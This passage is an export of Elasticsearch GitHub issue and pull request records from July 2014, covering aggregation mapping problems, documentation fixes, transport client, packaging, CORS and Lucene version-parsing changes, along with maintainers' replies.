</description><key id="38962898">7072</key><summary>Cann't executing "min" aggregations on elasticsearch-1.3.0</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ixpress</reporter><labels /><created>2014-07-29T06:56:06Z</created><updated>2014-07-30T12:31:48Z</updated><resolved>2014-07-29T12:31:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-29T12:31:31Z" id="50469558">You have a `remain` field which is mapped as a `string` instead of as a numeric type. Check all of the type mappings in your index as it may be in a different type (and you're not including the type name when you search)
</comment><comment author="ixpress" created="2014-07-30T01:28:57Z" id="50563156">You are right, the mapping is the problem.
Is there any way to make the logstash do the right map?
The default map all the field to `string`!

```
logstash-1.4.2/lib/logstash/outputs/elasticsearch/elasticsearch-template.json
```
</comment><comment author="clintongormley" created="2014-07-30T10:23:43Z" id="50597815">Hi @ixpress 

You're running into #2401, specifically: https://github.com/elasticsearch/elasticsearch/issues/2401#issuecomment-10327282

The problem is that you're indexing the `remain` field as a string `"123"` and, because of #2401, numeric detection is not happening correctly there.  You have two choices, either:
1. Use `convert` in the [logstash `mutate` plugin](http://logstash.net/docs/1.4.2/filters/mutate) to convert  `remain` to an integer, or
2. Add your own [index template](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/indices-templates.html#indices-templates) with a specific mapping for `remain` 

Closing in favour of #2401.
</comment><comment author="clintongormley" created="2014-07-30T12:31:48Z" id="50607879">Actually, on reviewing this, this isn't related to #2401 at all and it is working as expected.  `numeric_detection` (detecting strings which contain numbers) is off by default.  The two solutions I provided in the previous comment are still your best options though.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix typo in scripting.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7071</link><project id="" key="" /><description>Replace the mvel by groovy in the forgotten place.
I add the previous change in this one.
Sorry for the spam!
</description><key id="38951095">7071</key><summary>Fix typo in scripting.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/GaelTadh/following{/other_user}', u'events_url': u'https://api.github.com/users/GaelTadh/events{/privacy}', u'organizations_url': u'https://api.github.com/users/GaelTadh/orgs', u'url': u'https://api.github.com/users/GaelTadh', u'gists_url': u'https://api.github.com/users/GaelTadh/gists{/gist_id}', u'html_url': u'https://github.com/GaelTadh', u'subscriptions_url': u'https://api.github.com/users/GaelTadh/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/5190064?v=4', u'repos_url': u'https://api.github.com/users/GaelTadh/repos', u'received_events_url': u'https://api.github.com/users/GaelTadh/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/GaelTadh/starred{/owner}{/repo}', u'site_admin': False, u'login': u'GaelTadh', u'type': u'User', u'id': 5190064, u'followers_url': u'https://api.github.com/users/GaelTadh/followers'}</assignee><reporter username="">gabriel-tessier</reporter><labels /><created>2014-07-29T01:37:40Z</created><updated>2014-07-29T10:30:32Z</updated><resolved>2014-07-29T10:30:32Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-29T10:30:25Z" id="50459811">Merged, thanks 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix typo in scripting.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7070</link><project id="" key="" /><description /><key id="38950917">7070</key><summary>Fix typo in scripting.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/GaelTadh/following{/other_user}', u'events_url': u'https://api.github.com/users/GaelTadh/events{/privacy}', u'organizations_url': u'https://api.github.com/users/GaelTadh/orgs', u'url': u'https://api.github.com/users/GaelTadh', u'gists_url': u'https://api.github.com/users/GaelTadh/gists{/gist_id}', u'html_url': u'https://github.com/GaelTadh', u'subscriptions_url': u'https://api.github.com/users/GaelTadh/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/5190064?v=4', u'repos_url': u'https://api.github.com/users/GaelTadh/repos', u'received_events_url': u'https://api.github.com/users/GaelTadh/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/GaelTadh/starred{/owner}{/repo}', u'site_admin': False, u'login': u'GaelTadh', u'type': u'User', u'id': 5190064, u'followers_url': u'https://api.github.com/users/GaelTadh/followers'}</assignee><reporter username="">gabriel-tessier</reporter><labels /><created>2014-07-29T01:33:24Z</created><updated>2014-07-29T10:29:10Z</updated><resolved>2014-07-29T10:29:01Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-29T10:29:10Z" id="50459687">thanks, merged
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>"Uncomment if you want to disable JSONP" in yml file</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7069</link><project id="" key="" /><description>http://www.elasticsearch.org/blog/elasticsearch-1-3-0-released/

The following is new in 1.3.0 yml file:

```
# Uncomment if you want to disable JSONP as a valid return transport on the
# http server. With this enabled, it may pose a security risk, so disabling
# it unless you need it is recommended.
#
#http.jsonp.enable: false
```

Currently, the first sentence in the comment suggests that JSONP is still enabled by default.  Given that JSONP is disabled by default in 1.3.0, do we really mean "Uncomment and set to true if you want to _enable_ JSONP" .... ?  
</description><key id="38941167">7069</key><summary>"Uncomment if you want to disable JSONP" in yml file</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/spinscale/following{/other_user}', u'events_url': u'https://api.github.com/users/spinscale/events{/privacy}', u'organizations_url': u'https://api.github.com/users/spinscale/orgs', u'url': u'https://api.github.com/users/spinscale', u'gists_url': u'https://api.github.com/users/spinscale/gists{/gist_id}', u'html_url': u'https://github.com/spinscale', u'subscriptions_url': u'https://api.github.com/users/spinscale/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/667544?v=4', u'repos_url': u'https://api.github.com/users/spinscale/repos', u'received_events_url': u'https://api.github.com/users/spinscale/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/spinscale/starred{/owner}{/repo}', u'site_admin': False, u'login': u'spinscale', u'type': u'User', u'id': 667544, u'followers_url': u'https://api.github.com/users/spinscale/followers'}</assignee><reporter username="">ppf2</reporter><labels><label>docs</label><label>v1.3.1</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-28T22:40:07Z</created><updated>2014-07-29T07:11:05Z</updated><resolved>2014-07-29T07:10:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Update client.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7068</link><project id="" key="" /><description>Correction of java code example in node client part.
</description><key id="38931381">7068</key><summary>Update client.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">andersonss</reporter><labels /><created>2014-07-28T20:47:22Z</created><updated>2014-07-29T06:42:32Z</updated><resolved>2014-07-29T06:42:32Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="andersonss" created="2014-07-28T20:57:38Z" id="50399494">This problem continues to occur at the rest of documentation.
</comment><comment author="kimchy" created="2014-07-28T21:06:08Z" id="50400788">I see, I guess the the import static at the start is not obvious..., +1 on making it explicit.
</comment><comment author="dadoonet" created="2014-07-29T06:42:32Z" id="50441075">Indeed. Will be fixed globally with #6920.
Thanks for the PR!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Transport client: Don't add listed nodes to connected nodes list in sniff mode</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7067</link><project id="" key="" /><description>This commit effectively reverts e1aa91d , as it is not needed anymore to add the original listed nodes. The cluster state local call made will in fact always return at least the local node (see #6811).

There were a couple of downsides caused by putting the original listed nodes among the connected nodes:
1) in the following retries, they weren't seen as listed nodes anymore, thus the light connect wasn't used
2) among the connected nodes some were "bad" duplicates as they are already there and don't contain all needed info for each node. This was causing serialization problems for instance given that the node version was missing on the `DiscoveryNode` object (or `minCompatibilityVersion` after #6894).

(As a side note, the fact that nodes were appearing twice in the list was hiding #6829 in sniff mode, as more nodes than expected were in the list and then retried)

Next step is to enable transport client `sniff` mode in our tests, already in the work on a public branch: https://github.com/elasticsearch/elasticsearch/tree/enhancement/test-enable-transport-client-sniff .
</description><key id="38923258">7067</key><summary>Transport client: Don't add listed nodes to connected nodes list in sniff mode</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Discovery</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-28T19:21:55Z</created><updated>2015-06-07T19:14:09Z</updated><resolved>2014-07-28T19:49:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-07-28T19:41:37Z" id="50388250">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add support for interval multipliers in date histo aggregrations</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7066</link><project id="" key="" /><description>In date_histogram aggs, the `interval` supports one day, month, year etc

It'd be great to be able to specify `10y` or `5d` instead
</description><key id="38909074">7066</key><summary>Add support for interval multipliers in date histo aggregrations</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">clintongormley</reporter><labels><label>:Aggregations</label><label>adoptme</label><label>enhancement</label></labels><created>2014-07-28T16:47:57Z</created><updated>2014-12-23T10:59:56Z</updated><resolved>2014-12-23T10:59:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="raphi" created="2014-08-13T14:35:13Z" id="52056558">Agree that would be great. According to the documentation, it's working:
http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-aggregations-bucket-datehistogram-aggregation.html

But it's not.
</comment><comment author="clintongormley" created="2014-09-06T14:27:19Z" id="54713699">Also see #6408 
</comment><comment author="clintongormley" created="2014-09-06T14:28:01Z" id="54713715">Also see #6580 
</comment><comment author="colings86" created="2014-12-23T10:59:56Z" id="67940632">Closing in favour of https://github.com/elasticsearch/elasticsearch/issues/6580
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>query filter cache in function score query does not work</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7065</link><project id="" key="" /><description>accoding to the documentation http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-query-filter.html 

Using cache in a query filter in a function score query does not work.

``` javascript
{
    "query"         :
    {
        "function_score":
        {
            "score_mode"    : "first",
            "boost_mode"    : "replace",
            "query"         :
            {
                "match_all" : {}
            },
            "functions":
            [
                {
                   "filter":
                   {
                        "fquery" :
                        {
                            "query" :
                            {
                                "terms" : 
                                {
                                    "user"  : ["kimchy"],
                                    "minimum_should_match"      : 1
                                }
                            }
                        },
                        "_cache" : true
                   },
                   "script_score": 
                    {
                        "script" : "100"
                    }
                }
            ]
        }
    }
}
```

wihout the cache definition it works

``` javascript
{
    "query"         :
    {
        "function_score":
        {
            "score_mode"    : "first",
            "boost_mode"    : "replace",
            "query"         :
            {
                "match_all" : {}
            },
            "functions":
            [
                {
                   "filter":
                   {
                        "query" :
                        {
                            "terms" : 
                            {
                                "user"  : ["kimchy"],
                                "minimum_should_match"      : 1
                            }
                        }
                   },
                   "script_score": 
                    {
                        "script" : "100"
                    }
                }
            ]
        }
    }
}
&#180;&#180;&#180;
```
</description><key id="38899138">7065</key><summary>query filter cache in function score query does not work</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">DavidGOrtega</reporter><labels /><created>2014-07-28T15:05:30Z</created><updated>2014-07-28T16:46:46Z</updated><resolved>2014-07-28T15:21:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-28T15:21:29Z" id="50352821">Hi @DavidGOrtega 

Your nesting is incorrect. `_cache` should be at the same level as `query` inside the `fquery`:

```
{
  "query": {
    "function_score": {
      "score_mode": "first",
      "boost_mode": "replace",
      "query": {
        "match_all": {}
      },
      "functions": [
        {
          "filter": {
            "fquery": {
              "_cache": true,
              "query": {
                "terms": {
                  "user": [
                    "kimchy"
                  ],
                  "minimum_should_match": 1
                }
              }
            }
          },
          "script_score": {
            "script": "100"
          }
        }
      ]
    }
  }
}
```
</comment><comment author="DavidGOrtega" created="2014-07-28T16:46:46Z" id="50364473">OH Clinton, thats a crossed eyes bug!!

I swear that I tried several combinations :(

Sorry for the inconvenience.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>RPM misnamed</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7064</link><project id="" key="" /><description>The RPM should be named &lt;name&gt;-&lt;version&gt;-&lt;release&gt;.noarch.rpm instead of &lt;name&gt;-&lt;version&gt;.noarch.rpm

This is the standard naming format used by Fedora and RedHat
</description><key id="38894725">7064</key><summary>RPM misnamed</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/spinscale/following{/other_user}', u'events_url': u'https://api.github.com/users/spinscale/events{/privacy}', u'organizations_url': u'https://api.github.com/users/spinscale/orgs', u'url': u'https://api.github.com/users/spinscale', u'gists_url': u'https://api.github.com/users/spinscale/gists{/gist_id}', u'html_url': u'https://github.com/spinscale', u'subscriptions_url': u'https://api.github.com/users/spinscale/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/667544?v=4', u'repos_url': u'https://api.github.com/users/spinscale/repos', u'received_events_url': u'https://api.github.com/users/spinscale/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/spinscale/starred{/owner}{/repo}', u'site_admin': False, u'login': u'spinscale', u'type': u'User', u'id': 667544, u'followers_url': u'https://api.github.com/users/spinscale/followers'}</assignee><reporter username="">jokajak</reporter><labels><label>:Packaging</label></labels><created>2014-07-28T14:23:41Z</created><updated>2014-07-30T09:52:42Z</updated><resolved>2014-07-29T08:15:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-07-29T08:15:20Z" id="50447631">Hey there,

we decided to remove the revision/release from the RPM and debian package names, as we always release those packages along with a new Elasticsearch version, and thus that version would always be `1`.

I havent yet seen, that this clashes with anything, you can use the package in your own repository as we do in the ones we provide. So I do not consider this a problem at the moment, or do we break anything with this approach?
</comment><comment author="jokajak" created="2014-07-29T11:32:18Z" id="50464604">Nothing broken with this approach.  I attempted to import the RPM in to a build system called koji (not really relevant).  That build system complained that the RPM wasn't named as expected so I decided to file a report.

Thanks for the information.
</comment><comment author="rickard-von-essen" created="2014-07-30T09:52:42Z" id="50595129">@spinscale 
It's good to [Fedora Packaging Guidelines](http://fedoraproject.org/wiki/Packaging:NamingGuidelines#Package_Versioning).

Removing the `-1` brakes the following puppet code

``` puppet
  package { 'elasticsearch':
    ensure   =&gt; $version,
    provider =&gt; rpm,
    source   =&gt; "https://download.elasticsearch.org/elasticsearch/elasticsearch/elasticsearch-${version}.noarch.rpm",
    notify  =&gt; Service['elasticsearch'],
  }
```

Of course it would be possible hardcode the `-1` in the ensure, but that will break the next time you change your mind about versioning. If you include the revision in the file name the code will be future proof.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[Discovery] Master fault detection and nodes fault detection should take cluster name into account.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7063</link><project id="" key="" /><description>Both master fault detection and nodes fault detection request should also send the cluster name, so that on the receiving side the handling of these requests can be failed with an error. This error can be caught on the sending side and for master fault detection the node can fail the master locally and for nodes fault detection the node can be failed.

This validation will almost never fail in a production cluster, but is more likely to fail in automated tests where cluster / nodes are created and destroyed very frequently.

This PR is based on #7042 and is meant for the improve zen branch only.
</description><key id="38894547">7063</key><summary>[Discovery] Master fault detection and nodes fault detection should take cluster name into account.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels><label>enhancement</label><label>resiliency</label></labels><created>2014-07-28T14:21:51Z</created><updated>2015-05-18T23:30:42Z</updated><resolved>2014-07-28T18:53:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-07-28T18:06:05Z" id="50375183">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: Fix circuit breaker tests for remote clusters and bwc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7062</link><project id="" key="" /><description>Adds additional version checks in NodeStats for older versions

When using an external cluster (backwards compatibility tests), the act
of checking the request breaker requires a network buffer, which
increments the breaker. This change only checks the request breaker in
InternalTestCluster and uses Guice to retrieve it instead of
a (possible) network request. The fielddata breaker is still checked
every time.

Also removed the now unused InternalCircuitBreakerService class
</description><key id="38894399">7062</key><summary>Test: Fix circuit breaker tests for remote clusters and bwc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dakrone</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-28T14:20:32Z</created><updated>2015-06-07T11:46:16Z</updated><resolved>2014-07-28T15:18:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-07-28T14:26:53Z" id="50345186">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Adds support for wildcards in selected fields</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7061</link><project id="" key="" /><description>This could useful to generate all term vectors or a chosen set of them.
</description><key id="38893240">7061</key><summary>Adds support for wildcards in selected fields</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">alexksikes</reporter><labels><label>:Term Vectors</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-28T14:08:47Z</created><updated>2015-06-07T12:32:59Z</updated><resolved>2014-07-30T15:48:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-07-30T09:28:29Z" id="50592959">The change looks good but I think it would be more consistent with other APIs to accept wildcards in field names than having a `generate_all` flag? (See eg. http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-multi-match-query.html#_literal_fields_literal_and_per_field_boosting)
</comment><comment author="jpountz" created="2014-07-30T15:06:38Z" id="50627613">@alexksikes left some comments
</comment><comment author="jpountz" created="2014-07-30T15:35:25Z" id="50632088">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Suggestion auto-complete query with fuzziness ranks typos over exact matches</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7060</link><project id="" key="" /><description>Given an index with a field of type completion when searching using fuzziness the exact matches do not rank higher than the mistyped matches. 

This is true even when the score assigned is the same for all the entries.
</description><key id="38889017">7060</key><summary>Suggestion auto-complete query with fuzziness ranks typos over exact matches</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mericano1</reporter><labels /><created>2014-07-28T13:21:43Z</created><updated>2014-07-28T15:23:00Z</updated><resolved>2014-07-28T15:23:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-28T15:23:00Z" id="50353033">Closing in favour of #4441 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Security: Allow to configure CORS allow-credentials header to work via SSL</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7059</link><project id="" key="" /><description>This adds support to return the "Access-Control-Allow-Credentials" header
if needed, so CORS will work flawlessly with authenticated applications.

Closes #6380
</description><key id="38888352">7059</key><summary>Security: Allow to configure CORS allow-credentials header to work via SSL</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>:Settings</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-28T13:13:17Z</created><updated>2015-06-07T12:41:16Z</updated><resolved>2014-08-05T15:34:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="erikringsmuth" created="2014-07-28T13:57:30Z" id="50341190">I pulled this code and ran it locally. I can confirm it fixes the issue. Thanks @spinscale!
</comment><comment author="s1monw" created="2014-07-29T14:34:44Z" id="50483960">left some minor comments
</comment><comment author="spinscale" created="2014-07-30T13:00:15Z" id="50610520">made all the CORS configuration options constants in `NettyHttpServerTransport`
</comment><comment author="kimchy" created="2014-08-05T12:52:53Z" id="51192725">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Stops direct subclassing of InternalNumericMetricsAggregation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7058</link><project id="" key="" /><description>Must subclass either InternalNumericMetricsAggregation.SingleValue or InternalNumericMetricsAggregation.MultiValue
</description><key id="38888096">7058</key><summary>Stops direct subclassing of InternalNumericMetricsAggregation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Aggregations</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-28T13:10:14Z</created><updated>2015-06-07T12:33:41Z</updated><resolved>2014-07-28T13:15:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-07-28T13:11:09Z" id="50335669">LGTM
</comment><comment author="colings86" created="2014-07-28T13:15:02Z" id="50336075">Merged into master and 1.x
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Mappings: Deprecate `index_name`.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7057</link><project id="" key="" /><description>Close #6677
</description><key id="38887292">7057</key><summary>Mappings: Deprecate `index_name`.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">jpountz</reporter><labels><label>:Mapping</label><label>breaking</label></labels><created>2014-07-28T12:59:18Z</created><updated>2015-05-25T18:29:28Z</updated><resolved>2015-05-25T18:29:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-07-29T17:22:36Z" id="50508579">Left some comments. Hope this helps.
</comment><comment author="martijnvg" created="2014-08-05T09:26:06Z" id="51173185">I left a couple of comments. Maybe we can also add a small integration test that checks if either index_name of path with just_name is used on indices before 1.4.0 and after?
</comment><comment author="clintongormley" created="2015-05-25T18:29:19Z" id="105285494">Closed by #9570
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Lucene version checker should use `Lucene.parseVersionLenient`</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7056</link><project id="" key="" /><description>With commit 07c632a2d4dbefe44e8f25dc4ded6cf143d60e41, we now have a new Lucene.parseVersionLenient(String, Version) method which tries to find an existing Lucene version based on the two first digits X.Y of X.Y.Z String.
</description><key id="38885025">7056</key><summary>Lucene version checker should use `Lucene.parseVersionLenient`</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>:Plugins</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-28T12:25:31Z</created><updated>2015-06-07T12:33:52Z</updated><resolved>2014-07-28T14:49:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-07-28T13:10:49Z" id="50335642">LGTM 
</comment><comment author="nik9000" created="2014-07-28T14:00:44Z" id="50341593">Cool.
</comment><comment author="dadoonet" created="2014-07-28T14:49:05Z" id="50348344">Closed with 264d59c3e2dd727085efbd7e23e4ac55ba46d3d2 in master and c698ff72d21cf78c362465e91ba8afb44a06ea22 in 1.x
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Support parsing lucene minor version strings</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7055</link><project id="" key="" /><description>We parse the version that is shipped with the Lucene segments in order
to find the version of lucene that wrote a particular segment. Yet, some lucene
version ie:
- 4.3.1 (Elasticsearch 0.90.2)
- 4.5.1 (Elasticsearch 0.90.7)
- 3.6.1 (pre Elasticsearch 0.90.0)

wrote illegal strings containing the minor version which causes IAE exceptions
being thrown from lucenes parsing method.

Note: this is a BWC issues that causes replication to fail if the segment was created with on of the broken version and the node is upgraded to `Elasticsearch 1.3.0`
